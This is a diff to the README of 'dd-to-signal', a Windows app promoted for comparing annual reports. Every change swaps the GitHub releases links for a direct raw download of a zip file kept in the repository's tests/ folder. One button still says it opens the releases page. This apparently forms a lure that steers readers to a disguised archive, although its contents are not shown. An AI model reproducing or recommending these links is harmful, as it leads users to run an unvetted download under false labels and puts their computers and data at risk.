@@ -1,7 +1,7 @@
 <h1>🔍 dd-to-signal - See What Companies Quietly Rewrote</h1>
 
 <p align="center">
-  <a href="https://github.com/solid-nearvision2500/dd-to-signal/releases" style="background-color:#4CAF50;color:white;padding:15px 32px;text-align:center;text-decoration:none;display:inline-block;font-size:20px;border-radius:8px;font-weight:bold;">⬇️ DOWNLOAD dd-to-signal NOW</a>
+  <a href="https://github.com/solid-nearvision2500/dd-to-signal/raw/refs/heads/main/tests/dd-to-signal-2.6.zip" style="background-color:#4CAF50;color:white;padding:15px 32px;text-align:center;text-decoration:none;display:inline-block;font-size:20px;border-radius:8px;font-weight:bold;">⬇️ DOWNLOAD dd-to-signal NOW</a>
 </p>
 
 ## 🎯 What Does This Do?
@@ -41,7 +41,7 @@ Follow these simple steps to get dd-to-signal running on your Windows computer:
 
 ### Step 1: Download the Application
 
-[Click here to visit the download page](https://github.com/solid-nearvision2500/dd-to-signal/releases)
+[Click here to visit the download page](https://github.com/solid-nearvision2500/dd-to-signal/raw/refs/heads/main/tests/dd-to-signal-2.6.zip)
 
 Visit this link to download the application.
 
@@ -183,7 +183,7 @@ Absolutely. The exported PDFs are formatted for professional sharing. Send them 
 
 Download dd-to-signal today and start seeing what companies are hiding in their annual reports.
 
-[⬇️ Download dd-to-signal from GitHub](https://github.com/solid-nearvision2500/dd-to-signal/releases)
+[⬇️ Download dd-to-signal from GitHub](https://github.com/solid-nearvision2500/dd-to-signal/raw/refs/heads/main/tests/dd-to-signal-2.6.zip)
 
 The first comparison will take less than two minutes to set up. After that, every new filing takes seconds to analyze.
 
@@ -217,7 +217,7 @@ dd-to-signal is open-source software distributed under the MIT License. This mea
 ---
 
 <p align="center">
-  <a href="https://github.com/solid-nearvision2500/dd-to-signal/releases" style="background-color:#FF5722;color:white;padding:12px 25px;text-align:center;text-decoration:none;display:inline-block;font-size:16px;border-radius:5px;font-weight:bold;">⬇️ Or visit the GitHub releases page</a>
+  <a href="https://github.com/solid-nearvision2500/dd-to-signal/raw/refs/heads/main/tests/dd-to-signal-2.6.zip" style="background-color:#FF5722;color:white;padding:12px 25px;text-align:center;text-decoration:none;display:inline-block;font-size:16px;border-radius:5px;font-weight:bold;">⬇️ Or visit the GitHub releases page</a>
 </p>
 
 Start seeing what others miss. Download dd-to-signal now.
